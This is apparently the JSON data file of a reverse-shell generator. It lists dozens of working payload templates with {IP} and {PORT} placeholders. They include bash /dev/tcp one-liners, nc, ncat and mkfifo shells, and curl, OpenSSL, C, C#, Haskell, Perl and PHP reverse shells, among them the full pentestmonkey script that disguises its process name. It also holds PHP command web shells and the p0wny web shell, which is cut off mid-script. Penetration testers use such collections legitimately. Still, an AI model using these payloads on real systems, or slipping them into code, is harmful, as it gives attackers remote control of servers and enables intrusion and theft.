{
	"Linux": [
	  {
		"name": "bash -i",
		"command": "{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1"
	  },
	  {
		"name": "bash 196", 
	    "command": "0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {SHELL} <&196 >&196 2>&196"
	  },
      {
        "name": "bash read line",
        "command": "exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done"
      },
      {
        "name": "bash 5",
        "command": "{SHELL} -i 5<> /dev/tcp/{IP}/{PORT} 0<&5 1>&5 2>&5"
      },
      {
        "name": "bash udp",
        "command": "sh -i >& /dev/udp/{IP}/{PORT} 0>&1"
      },
      {
        "name": "BusyBox nc -e",
        "command": "busybox nc {IP} {PORT} -e sh"
      },
      {
        "name": "nc mkfifo",
        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {IP} {PORT} >/tmp/f"
      },
      {
        "name": "nc -e",
        "command": "nc {IP} {PORT} -e bash"
      },
      {
        "name": "nc -c",
        "command": "nc -c bash {IP} {PORT}"
      },
      {
        "name": "ncat -e",
        "command": "ncat {IP} {PORT} -e bash"
      },
      {
        "name": "ncat udp",
        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u {IP} {PORT} >/tmp/f"
      },
      {
        "name": "curl",
        "command": "C='curl -Ns telnet://{IP}:{PORT}'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null"
      },
      {
        "name": "rustcat",
        "command": "rcat connect -s bash {IP} {PORT}"
      },
      {
        "name": "C",
        "command": "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = {PORT};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{IP}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"bash\", NULL};\n    execvp(\"bash\", argv);\n\n    return 0;       \n}\n"
      },
      {
        "name": "C# TCP Client",
        "command": "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n    public class Program\n    {\n        static StreamWriter streamWriter;\n\n        public static void Main(string[] args)\n        {\n            using(TcpClient client = new TcpClient(\"{IP}\", {PORT}))\n            {\n                using(Stream stream = client.GetStream())\n                {\n                    using(StreamReader rdr = new StreamReader(stream))\n                    {\n                        streamWriter = new StreamWriter(stream);\n                        \n                        StringBuilder strInput = new StringBuilder();\n\n                        Process p = new Process();\n                        p.StartInfo.FileName = \"bash\";\n                        p.StartInfo.CreateNoWindow = true;\n                        p.StartInfo.UseShellExecute = false;\n                        p.StartInfo.RedirectStandardOutput = true;\n                        p.StartInfo.RedirectStandardInput = true;\n                        p.StartInfo.RedirectStandardError = true;\n                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n                        p.Start();\n                        p.BeginOutputReadLine();\n\n                        while(true)\n                        {\n                            strInput.Append(rdr.ReadLine());\n                            //strInput.Append(\"\\n\");\n                            p.StandardInput.WriteLine(strInput);\n                            strInput.Remove(0, strInput.Length);\n                        }\n                    }\n                }\n            }\n        }\n\n        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n    }\n}\n"
      },
      {
        "name": "C# bash -i",
        "command": "using System;\nusing System.Diagnostics;\n\nnamespace BackConnect {\n  class ReverseBash {\n    public static void Main(string[] args) {\n      Process proc = new System.Diagnostics.Process();\n      proc.StartInfo.FileName = \"bash\";\n      proc.StartInfo.Arguments = \"-c \\\"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\\\"\";\n      proc.StartInfo.UseShellExecute = false;\n      proc.StartInfo.RedirectStandardOutput = true;\n      proc.Start();\n\n      while (!proc.StandardOutput.EndOfStream) {\n        Console.WriteLine(proc.StandardOutput.ReadLine());\n      }\n    }\n  }\n}\n"
      },
      {
        "name": "Hashkell #1",
        "command": "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | bash -i 2>&1 | nc {IP} {PORT} >/tmp/f\"\n"
      },
      {
        "name": "OpenSSL",
        "command": "mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {IP}:{PORT} > /tmp/s; rm /tmp/s"
      },
      {
        "name": "Perl",
        "command": "perl -e 'use Socket;$i=\"{IP}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"bash -i\");};'\n"
      },
      {
        "name": "Perl no sh",
        "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{IP}:{PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n"
      },
      {
        "name": "Perl PentestMonkey",
        "command": "#!/usr/bin/perl -w\n# perl-reverse-shell - A Reverse Shell implementation in PERL\n# Copyright (C) 2006 pentestmonkey@pentestmonkey.net\n#\n# This tool may be used for legal purposes only.  Users take full responsibility\n# for any actions performed using this tool.  The author accepts no liability\n# for damage caused by this tool.  If these terms are not acceptable to you, then\n# do not use this tool.\n#\n# In all other respects the GPL version 2 applies:\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License version 2 as\n# published by the Free Software Foundation.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License along\n# with this program; if not, write to the Free Software Foundation, Inc.,\n# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n#\n# This tool may be used for legal purposes only.  Users take full responsibility\n# for any actions performed using this tool.  If these terms are not acceptable to\n# you, then do not use this tool.\n#\n# You are encouraged to send comments, improvements or suggestions to\n# me at pentestmonkey@pentestmonkey.net\n#\n# Description\n# -----------\n# This script will make an outbound TCP connection to a hardcoded IP and port.\n# The recipient will be given a shell running as the current user (apache normally).\n#\n\nuse strict;\nuse Socket;\nuse FileHandle;\nuse POSIX;\nmy $VERSION = \"1.0\";\n\n# Where to send the reverse shell.  Change these.\nmy $ip = '{IP}';\nmy $port = {PORT};\n\n# Options\nmy $daemon = 1;\nmy $auth   = 0; # 0 means authentication is disabled and any \n        # source IP can access the reverse shell\nmy $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);\n\n# Declarations\nmy $global_page = \"\";\nmy $fake_process_name = \"/usr/sbin/apache\";\n\n# Change the process name to be less conspicious\n$0 = \"[httpd]\";\n\n# Authenticate based on source IP address if required\nif (defined($ENV{'REMOTE_ADDR'})) {\n    cgiprint(\"Browser IP address appears to be: $ENV{'REMOTE_ADDR'}\");\n\n    if ($auth) {\n        unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {\n            cgiprint(\"ERROR: Your client isn't authorised to view this page\");\n            cgiexit();\n        }\n    }\n} elsif ($auth) {\n    cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\");\n    cgiexit(0);\n}\n\n# Background and dissociate from parent process if required\nif ($daemon) {\n    my $pid = fork();\n    if ($pid) {\n        cgiexit(0); # parent exits\n    }\n\n    setsid();\n    chdir('/');\n    umask(0);\n}\n\n# Make TCP connection for reverse shell\nsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\nif (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {\n    cgiprint(\"Sent reverse shell to $ip:$port\");\n    cgiprintpage();\n} else {\n    cgiprint(\"Couldn't open reverse shell to $ip:$port: $!\");\n    cgiexit();  \n}\n\n# Redirect STDIN, STDOUT and STDERR to the TCP connection\nopen(STDIN, \">&SOCK\");\nopen(STDOUT,\">&SOCK\");\nopen(STDERR,\">&SOCK\");\n$ENV{'HISTFILE'} = '/dev/null';\nsystem(\"w;uname -a;id;pwd\");\nexec({\"bash\"} ($fake_process_name, \"-i\"));\n\n# Wrapper around print\nsub cgiprint {\n    my $line = shift;\n    $line .= \"<p>\\n\";\n    $global_page .= $line;\n}\n\n# Wrapper around exit\nsub cgiexit {\n    cgiprintpage();\n    exit 0; # 0 to ensure we don't give a 500 response.\n}\n\n# Form HTTP response using all the messages gathered by cgiprint so far\nsub cgiprintpage {\n    print \"Content-Length: \" . length($global_page) . \"\\r\nConnection: close\\r\nContent-Type: text\\/html\\r\\n\\r\\n\" . $global_page;\n}\n"
      },
      {
        "name": "PHP PentestMonekey",
        "command": "<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '{IP}';\n$port = {PORT};\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; bash -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n    $pid = pcntl_fork();\n    \n    if ($pid == -1) {\n        printit(\"ERROR: Can't fork\");\n        exit(1);\n    }\n    \n    if ($pid) {\n        exit(0);  // Parent exits\n    }\n    if (posix_setsid() == -1) {\n        printit(\"Error: Can't setsid()\");\n        exit(1);\n    }\n\n    $daemon = 1;\n} else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n}\n\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n    printit(\"ERROR: Can't spawn shell\");\n    exit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n    if (feof($sock)) {\n        printit(\"ERROR: Shell connection terminated\");\n        break;\n    }\n\n    if (feof($pipes[1])) {\n        printit(\"ERROR: Shell process terminated\");\n        break;\n    }\n\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n    if (in_array($sock, $read_a)) {\n        if ($debug) printit(\"SOCK READ\");\n        $input = fread($sock, $chunk_size);\n        if ($debug) printit(\"SOCK: $input\");\n        fwrite($pipes[0], $input);\n    }\n\n    if (in_array($pipes[1], $read_a)) {\n        if ($debug) printit(\"STDOUT READ\");\n        $input = fread($pipes[1], $chunk_size);\n        if ($debug) printit(\"STDOUT: $input\");\n        fwrite($sock, $input);\n    }\n\n    if (in_array($pipes[2], $read_a)) {\n        if ($debug) printit(\"STDERR READ\");\n        $input = fread($pipes[2], $chunk_size);\n        if ($debug) printit(\"STDERR: $input\");\n        fwrite($sock, $input);\n    }\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n    if (!$daemon) {\n        print \"$string\\n\";\n    }\n}\n\n?>\n"
      },
      {
        "name": "PHP Ivan Sincek",
        "command": "<?php\n// Copyright (c) 2020 Ivan Sincek\n// v2.3\n// Requires PHP v5.0.0 or greater.\n// Works on Linux OS, macOS, and Windows OS.\n// See the original script at https://github.com/pentestmonkey/php-reverse-shell.\nclass Shell {\n    private $addr  = null;\n    private $port  = null;\n    private $os    = null;\n    private $shell = null;\n    private $descriptorspec = array(\n        0 => array('pipe', 'r'), // shell can read from STDIN\n        1 => array('pipe', 'w'), // shell can write to STDOUT\n        2 => array('pipe', 'w')  // shell can write to STDERR\n    );\n    private $buffer  = 1024;    // read/write buffer size\n    private $clen    = 0;       // command length\n    private $error   = false;   // stream read/write error\n    public function __construct($addr, $port) {\n        $this->addr = $addr;\n        $this->port = $port;\n    }\n    private function detect() {\n        $detected = true;\n        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS\n            $this->os    = 'LINUX';\n            $this->shell = 'bash';\n        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {\n            $this->os    = 'WINDOWS';\n            $this->shell = 'cmd.exe';\n        } else {\n            $detected = false;\n            echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n        }\n        return $detected;\n    }\n    private function daemonize() {\n        $exit = false;\n        if (!function_exists('pcntl_fork')) {\n            echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n        } else if (($pid = @pcntl_fork()) < 0) {\n            echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n        } else if ($pid > 0) {\n            $exit = true;\n            echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n        } else if (posix_setsid() < 0) {\n            // once daemonized you will actually no longer see the script's dump\n            echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n        } else {\n            echo \"DAEMONIZE: Completed successfully!\\n\";\n        }\n        return $exit;\n    }\n    private function settings() {\n        @error_reporting(0);\n        @set_time_limit(0); // do not impose the script execution time limit\n        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories\n    }\n    private function dump($data) {\n        $data = str_replace('<', '&lt;', $data);\n        $data = str_replace('>', '&gt;', $data);\n        echo $data;\n    }\n    private function read($stream, $name, $buffer) {\n        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream\n            $this->error = true;                            // set global error flag\n            echo \"STRM_ERROR: Cannot read from ${name}, script will now exit...\\n\";\n        }\n        return $data;\n    }\n    private function write($stream, $name, $data) {\n        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream\n            $this->error = true;                            // set global error flag\n            echo \"STRM_ERROR: Cannot write to ${name}, script will now exit...\\n\";\n        }\n        return $bytes;\n    }\n    // read/write method for non-blocking streams\n    private function rw($input, $output, $iname, $oname) {\n        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {\n            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length\n            $this->dump($data); // script's dump\n        }\n    }\n    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)\n    // we must read the exact byte length from a stream and not a single byte more\n    private function brw($input, $output, $iname, $oname) {\n        $fstat = fstat($input);\n        $size = $fstat['size'];\n        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {\n            // for some reason Windows OS pipes STDIN into STDOUT\n            // we do not like that\n            // we need to discard the data from the stream\n            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {\n                $this->clen -= $bytes;\n                $size -= $bytes;\n            }\n        }\n        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {\n            $size -= $bytes;\n            $this->dump($data); // script's dump\n        }\n    }\n    public function run() {\n        if ($this->detect() && !$this->daemonize()) {\n            $this->settings();\n\n            // ----- SOCKET BEGIN -----\n            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);\n            if (!$socket) {\n                echo \"SOC_ERROR: {$errno}: {$errstr}\\n\";\n            } else {\n                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS\n\n                // ----- SHELL BEGIN -----\n                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);\n                if (!$process) {\n                    echo \"PROC_ERROR: Cannot start the shell\\n\";\n                } else {\n                    foreach ($pipes as $pipe) {\n                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS\n                    }\n\n                    // ----- WORK BEGIN -----\n                    $status = proc_get_status($process);\n                    @fwrite($socket, \"SOCKET: Shell has connected! PID: \" . $status['pid'] . \"\\n\");\n                    do {\n                        $status = proc_get_status($process);\n                        if (feof($socket)) { // check for end-of-file on SOCKET\n                            echo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;\n                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running\n                            echo \"PROC_ERROR: Shell process has been terminated\\n\";   break; // feof() does not work with blocking streams\n                        }                                                                    // use proc_get_status() instead\n                        $streams = array(\n                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR\n                            'write'  => null,\n                            'except' => null\n                        );\n                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS\n                        if ($num_changed_streams === false) {\n                            echo \"STRM_ERROR: stream_select() failed\\n\"; break;\n                        } else if ($num_changed_streams > 0) {\n                            if ($this->os === 'LINUX') {\n                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\n                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\n                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\n                            } else if ($this->os === 'WINDOWS') {\n                                // order is important\n                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\n                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\n                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\n                            }\n                        }\n                    } while (!$this->error);\n                    // ------ WORK END ------\n\n                    foreach ($pipes as $pipe) {\n                        fclose($pipe);\n                    }\n                    proc_close($process);\n                }\n                // ------ SHELL END ------\n\n                fclose($socket);\n            }\n            // ------ SOCKET END ------\n\n        }\n    }\n}\necho '<pre>';\n// change the host address and/or port number as necessary\n$sh = new Shell('{IP}', {PORT});\n$sh->run();\nunset($sh);\n// garbage collector requires PHP v5.3.0 or greater\n// @gc_collect_cycles();\necho '</pre>';\n?>\n"
      },
      {
        "name": "PHP cmd",
        "command": "<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n<script>document.getElementById(\"cmd\").focus();</script>\n</html>\n"
      },
      {
        "name": "PHP cmd 2",
        "command": "<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>\n"
      },
      {
        "name": "PHP cmd small",
        "command": "<?=`$_GET[0]`?>"
      },
      {
        "name": "PHP exec",
        "command": "php -r '$sock=fsockopen(\"{IP}\",{PORT});exec(\"bash <&3 >&3 2>&3\");'\n"
      },
      {
        "name": "PHP shell_exec",
        "command": "php -r '$sock=fsockopen(\"{IP}\",{PORT});shell_exec(\"bash <&3 >&3 2>&3\");'\n"
      },
      {
        "name": "PHP system",
        "command": "php -r '$sock=fsockopen(\"{IP}\",{PORT});system(\"bash <&3 >&3 2>&3\");'\n"
      },
      {
        "name": "PHP passthru",
        "command": "php -r '$sock=fsockopen(\"{IP}\",{PORT});passthru(\"bash <&3 >&3 2>&3\");''\n"
      },
      {
        "name": "PHP `",
        "command": "php -r '$sock=fsockopen(\"{IP}\",{PORT});`bash <&3 >&3 2>&3`;'\n"
      },
      {
        "name": "PHP popen",
        "command": "php -r '$sock=fsockopen(\"{IP}\",{PORT});popen(\"bash <&3 >&3 2>&3\", \"r\");'\n"
      },
      {
        "name": "PHP proc_open",
        "command": "php -r '$sock=fsockopen(\"{IP}\",{PORT});$proc=proc_open(\"bash\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\n"
      },
      {
        "name": "P0wny shell (Webshell)",
        "command": "<?php\n\n$SHELL_CONFIG = array(\n    'username' => 'p0wny',\n    'hostname' => 'shell',\n);\n\nfunction expandPath($path) {\n    if (preg_match(\"#^(~[a-zA-Z0-9_.-]*)(/.*)?$#\", $path, $match)) {\n        exec(\"echo $match[1]\", $stdout);\n        return $stdout[0] . $match[2];\n    }\n    return $path;\n}\n\nfunction allFunctionExist($list = array()) {\n    foreach ($list as $entry) {\n        if (!function_exists($entry)) {\n            return false;\n        }\n    }\n    return true;\n}\n\nfunction executeCommand($cmd) {\n    $output = '';\n    if (function_exists('exec')) {\n        exec($cmd, $output);\n        $output = implode(\"\\n\", $output);\n    } else if (function_exists('shell_exec')) {\n        $output = shell_exec($cmd);\n    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\n        ob_start();\n        system($cmd);\n        $output = ob_get_contents();\n        ob_end_clean();\n    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\n        ob_start();\n        passthru($cmd);\n        $output = ob_get_contents();\n        ob_end_clean();\n    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {\n        $handle = popen($cmd, 'r');\n        while (!feof($handle)) {\n            $output .= fread($handle, 4096);\n        }\n        pclose($handle);\n    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {\n        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);\n        $output = stream_get_contents($pipes[1]);\n        proc_close($handle);\n    }\n    return $output;\n}\n\nfunction isRunningWindows() {\n    return stripos(PHP_OS, \"WIN\") === 0;\n}\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = \"\";\n\n    if (preg_match(\"/^\\s*cd\\s*(2>&1)?$/\", $cmd)) {\n        chdir(expandPath(\"~\"));\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir(expandPath($match[1]));\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        $stdout = executeCommand($cmd);\n    }\n\n    return array(\n        \"stdout\" => base64_encode($stdout),\n        \"cwd\" => base64_encode(getcwd())\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => base64_encode(getcwd()));\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    foreach ($files as &$filename) {\n        $filename = base64_encode($filename);\n    }\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => base64_encode('File not found / no read permission.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    } else {\n        return array(\n            'name' => base64_encode(basename($filePath)),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => base64_encode('Invalid path / no write permission.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => base64_encode('Done.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    }\n}\n\nfunction initShellConfig() {\n    global $SHELL_CONFIG;\n\n    if (isRunningWindows()) {\n        $username = getenv('USERNAME');\n        if ($username !== false) {\n            $SHELL_CONFIG['username'] = $username;\n        }\n    } else {\n        $pwuid = posix_getpwuid(posix_geteuid());\n        if ($pwuid !== false) {\n            $SHELL_CONFIG['username'] = $pwuid['name'];\n        }\n    }\n\n    $hostname = gethostname();\n    if ($hostname !== false) {\n        $SHELL_CONFIG['hostname'] = $hostname;\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n} else {\n    initShellConfig();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n                width: 100vw;\n                height: 100vh;\n                overflow: hidden;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n                max-width: calc(100vw - 2 * var(--shell-margin));\n                max-height: calc(100vh - 2 * var(--shell-margin));\n                resize: both;\n                overflow: hidden;\n                width: 100%;\n                height: 100%;\n                margin: var(--shell-margin) auto;\n            }\n\n            #shell-content {\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            :root {\n                --shell-margin: 25px;\n            }\n\n            @media (min-width: 1200px) {\n                :root {\n                    --shell-margin: 50px !important;\n                }\n            }\n\n            @media (max-width: 991px),\n                   (max-height: 600px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n                :root {\n                    --shell-margin: 0 !important;\n                }\n                #shell {\n                    resize: none;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n                padding: 10px 0;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n                box-sizing: border-box;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                